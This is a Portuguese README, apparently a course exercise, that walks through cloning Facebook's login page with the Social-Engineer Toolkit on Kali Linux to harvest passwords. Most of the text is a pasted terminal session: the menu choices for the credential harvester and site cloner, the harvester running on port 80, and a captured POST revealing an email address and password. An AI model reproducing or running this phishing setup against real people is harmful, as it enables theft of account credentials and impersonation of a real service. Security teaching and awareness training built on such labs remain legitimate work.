# Phishing para captura de senhas do Facebook

### Ferramentas

- Kali Linux
- setoolkit

### Configurando o Phishing no Kali Linux

- Acesso root: ``` sudo su ```
- Iniciando o setoolkit: ``` setoolkit ```
- Tipo de ataque: ``` Social-Engineering Attacks ```
- Vetor de ataque: ``` Web Site Attack Vectors ```
- Método de ataque: ```Credential Harvester Attack Method ```
- Método de ataque: ``` Site Cloner ```
- Obtendo o endereço da máquina: ``` ifconfig ```
- URL para clone: http://www.facebook.com

### Resutados

![Alt text](./passwd.png "Optional title")

##################################################################################
## RESULTADOS OBTIDOS NO DESAFIO DE PROJETO "CRIANDO UM PHISHING COM KALI LINUX ##
## Foi utilizada a ferramenta setoolkit no Kali Linux, e a destino do phishing  ##
## foi o site http://www.facebook.com                                           ##
##################################################################################

           ,..-,
         ,;;f^^"""-._
        ;;'          `-.
       ;/               `.
       ||  _______________\_______________________
       ||  |HHHHHHHHHHPo"~~\"o?HHHHHHHHHHHHHHHHHHH|
       ||  |HHHHHHHHHP-._   \,'?HHHHHHHHHHHHHHHHHH|
        |  |HP;""?HH|    """ |_.|HHP^^HHHHHHHHHHHH|
        |  |HHHb. ?H|___..--"|  |HP ,dHHHPo'|HHHHH|
        `| |HHHHHb.?Hb    .--J-dHP,dHHPo'_.rdHHHHH|
         \ |HHHi.`;;.H`-./__/-'H_,--'/;rdHHHHHHHHH|
           |HHHboo.\ `|"\"/"\" '/\ .'dHHHHHHHHHHHH|
           |HHHHHHb`-|.  \|  \ / \/ dHHHHHHHHHHHHH|
           |HHHHHHHHb| \ |\   |\ |`|HHHHHHHHHHHHHH|
           |HHHHHHHHHb  \| \  | \| |HHHHHHHHHHHHHH|
           |HHHHHHHHHHb |\  \|  |\|HHHHHHHHHHHHHHH|
           |HHHHHHHHHHHb| \  |  / dHHHHHHHHHHHHHHH|
           |HHHHHHHHHHHHb  \/ \/ .fHHHHHHHHHHHHHHH|
           |HHHHHHHHHHHHH| /\ /\ |HHHHHHHHHHHHHHHH|
           |""""""""""""""""""""""""""""""""""""""|
           |,;=====.     ,-.  =.       ,=,,=====. |
           |||     '    //"\\   \\   //  ||     ' |
           |||         ,/' `\.  `\. ,/'  ``=====. |
           |||     .   //"""\\   \\_//    .     |||
           |`;=====' =''     ``=  `-'     `=====''|
           |______________________________________|


[---]        The Social-Engineer Toolkit (SET)         [---]
[---]        Created by: David Kennedy (ReL1K)         [---]
                      Version: 8.0.3
                    Codename: 'Maverick'
[---]        Follow us on Twitter: @TrustedSec         [---]
[---]        Follow me on Twitter: @HackingDave        [---]
[---]       Homepage: https://www.trustedsec.com       [---]
        Welcome to the Social-Engineer Toolkit (SET).
         The one stop shop for all of your SE needs.

   The Social-Engineer Toolkit is a product of TrustedSec.

           Visit: https://www.trustedsec.com

   It's easy to update using the PenTesters Framework! (PTF)
Visit https://github.com/trustedsec/ptf to update all your tools!


 Select from the menu:

   1) Social-Engineering Attacks
   2) Penetration Testing (Fast-Track)
   3) Third Party Modules
   4) Update the Social-Engineer Toolkit
   5) Update SET configuration
   6) Help, Credits, and About

  99) Exit the Social-Engineer Toolkit

set> 1
===========================
Select from the menu:

   1) Spear-Phishing Attack Vectors
   2) Website Attack Vectors
   3) Infectious Media Generator
   4) Create a Payload and Listener
   5) Mass Mailer Attack
   6) Arduino-Based Attack Vector
   7) Wireless Access Point Attack Vector
   8) QRCode Generator Attack Vector
   9) Powershell Attack Vectors
  10) Third Party Modules

  99) Return back to the main menu.

set> 2
===========================

The Web Attack module is a unique way of utilizing multiple web-based attacks in order to compromise the intended victim.

The Java Applet Attack method will spoof a Java Certificate and deliver a Metasploit-based payload. Uses a customized java applet created by Thomas Werth to deliver the payload.

The Metasploit Browser Exploit method will utilize select Metasploit browser exploits through an iframe and deliver a Metasploit payload.

The Credential Harvester method will utilize web cloning of a web- site that has a username and password field and harvest all the information posted to the website.

The TabNabbing method will wait for a user to move to a different tab, then refresh the page to something different.

The Web-Jacking Attack method was introduced by white_sheep, emgent. This method utilizes iframe replacements to make the highlighted URL link to appear legitimate however when clicked a window pops up then is replaced with the malicious link. You can edit the link replacement settings in the set_config if it's too slow/fast.

The Multi-Attack method will add a combination of attacks through the web attack menu. For example, you can utilize the Java Applet, Metasploit Browser, Credential Harvester/Tabnabbing all at once to see which is successful.

The HTA Attack method will allow you to clone a site and perform PowerShell injection through HTA files which can be used for Windows-based PowerShell exploitation through the browser.

   1) Java Applet Attack Method
   2) Metasploit Browser Exploit Method
   3) Credential Harvester Attack Method
   4) Tabnabbing Attack Method
   5) Web Jacking Attack Method
   6) Multi-Attack Web Method
   7) HTA Attack Method

  99) Return to Main Menu

set> 3 
===================
set> 2

The Web Attack module is a unique way of utilizing multiple web-based attacks in order to compromise the intended victim.

The Java Applet Attack method will spoof a Java Certificate and deliver a Metasploit-based payload. Uses a customized java applet created by Thomas Werth to deliver the payload.

The Metasploit Browser Exploit method will utilize select Metasploit browser exploits through an iframe and deliver a Metasploit payload.

The Credential Harvester method will utilize web cloning of a web- site that has a username and password field and harvest all the information posted to the website.

The TabNabbing method will wait for a user to move to a different tab, then refresh the page to something different.

The Web-Jacking Attack method was introduced by white_sheep, emgent. This method utilizes iframe replacements to make the highlighted URL link to appear legitimate however when clicked a window pops up then is replaced with the malicious link. You can edit the link replacement settings in the set_config if it's too slow/fast.

The Multi-Attack method will add a combination of attacks through the web attack menu. For example, you can utilize the Java Applet, Metasploit Browser, Credential Harvester/Tabnabbing all at once to see which is successful.

The HTA Attack method will allow you to clone a site and perform PowerShell injection through HTA files which can be used for Windows-based PowerShell exploitation through the browser.

   1) Java Applet Attack Method
   2) Metasploit Browser Exploit Method
   3) Credential Harvester Attack Method
   4) Tabnabbing Attack Method
   5) Web Jacking Attack Method
   6) Multi-Attack Web Method
   7) HTA Attack Method

  99) Return to Main Menu

set:webattack> 3
==================

set:webattack>3

 The first method will allow SET to import a list of pre-defined web
 applications that it can utilize within the attack.

 The second method will completely clone a website of your choosing
 and allow you to utilize the attack vectors within the completely
 same web application you were attempting to clone.

 The third method allows you to import your own website, note that you
 should only have an index.html when using the import website
 functionality.
   
   1) Web Templates
   2) Site Cloner
   3) Custom Import

  99) Return to Webattack Menu

set:webattack> 1

===================

[-] Credential harvester will allow you to utilize the clone capabilities within SET
[-] to harvest credentials or parameters from a website as well as place them into a report

-------------------------------------------------------------------------------
--- * IMPORTANT * READ THIS BEFORE ENTERING IN THE IP ADDRESS * IMPORTANT * ---

The way that this works is by cloning a site and looking for form fields to
rewrite. If the POST fields are not usual methods for posting forms this 
could fail. If it does, you can always save the HTML, rewrite the forms to
be standard forms and use the "IMPORT" feature. Additionally, really 
important:

If you are using an EXTERNAL IP ADDRESS, you need to place the EXTERNAL
IP address below, not your NAT address. Additionally, if you don't know
basic networking concepts, and you have a private IP address, you will
need to do port forwarding to your NAT IP address from your external IP
address. A browser doesn’t know how to communicate with a private IP
address, so if you don't specify an external IP address if you are using
this from an external perspective, it will not work. This isn't a SET issue
this is how networking works.

set:webattack> IP address for the POST back in Harvester/Tabnabbing [192.168.1.10]: (enter) 

==================

set:webattack> IP address for the POST back in Harvester/Tabnabbing [192.168.1.10]: 
[-] SET supports both HTTP and HTTPS
[-] Example: http://www.thisisafakesite.com
set:webattack> Enter the url to clone: www.facebook.com

[*] Cloning the website: https://login.facebook.com/login.php                                                                                         
[*] This could take a little bit...                                                                                                                   

The best way to use this attack is if username and password form fields are available. Regardless, this captures all POSTs on a website.              
[*] The Social-Engineer Toolkit Credential Harvester Attack
[*] Credential Harvester is running on port 80                                                                                                        
[*] Information will be displayed to you as it arrives below:   (192.168.1.10)

=======================

[-] SET supports both HTTP and HTTPS
[-] Example: http://www.thisisafakesite.com
set:webattack> Enter the url to clone: www.facebook.com

[*] Cloning the website: https://login.facebook.com/login.php                                                                                         
[*] This could take a little bit...                                                                                                                   

The best way to use this attack is if username and password form fields are available. Regardless, this captures all POSTs on a website.              
[*] The Social-Engineer Toolkit Credential Harvester Attack
[*] Credential Harvester is running on port 80                                                                                                        
[*] Information will be displayed to you as it arrives below:                                                                                         
10.5.128.1 - - [14/Jan/2024 10:40:25] "GET / HTTP/1.1" 200 -
[*] WE GOT A HIT! Printing the output:
PARAM: jazoest=21020                                                                                                                                  
PARAM: lsd=AVoatx-ZTkc                                                                                                                                
PARAM: display=                                                                                                                                       
PARAM: isprivate=                                                                                                                                     
PARAM: return_session=                                                                                                                                
POSSIBLE USERNAME FIELD FOUND: skip_api_login=                                                                                                        
PARAM: signed_next=                                                                                                                                   
PARAM: trynum=1                                                                                                                                       
PARAM: timezone=                                                                                                                                      
PARAM: lgndim=                                                                                                                                        
PARAM: lgnrnd=053826_qtnO                                                                                                                             
PARAM: lgnjs=n                                                                                                                                        
POSSIBLE USERNAME FIELD FOUND: email=prosa41@gmail.com                                                                                                  
POSSIBLE PASSWORD FIELD FOUND: pass=qwertyuiop                                                                                                        
POSSIBLE USERNAME FIELD FOUND: login=1                                                                                                                
PARAM: prefill_contact_point=                                                                                                                         
PARAM: prefill_source=                                                                                                                                
PARAM: prefill_type=                                                                                                                                  
PARAM: first_prefill_source=                                                                                                                          
PARAM: first_prefill_type=                                                                                                                            
PARAM: had_cp_prefilled=false                                                                                                                         
POSSIBLE PASSWORD FIELD FOUND: had_password_prefilled=false                                                                                           
PARAM: ab_test_data=                                                                                                                                  
[*] WHEN YOU'RE FINISHED, HIT CONTROL-C TO GENERATE A REPORT.                                                                                         
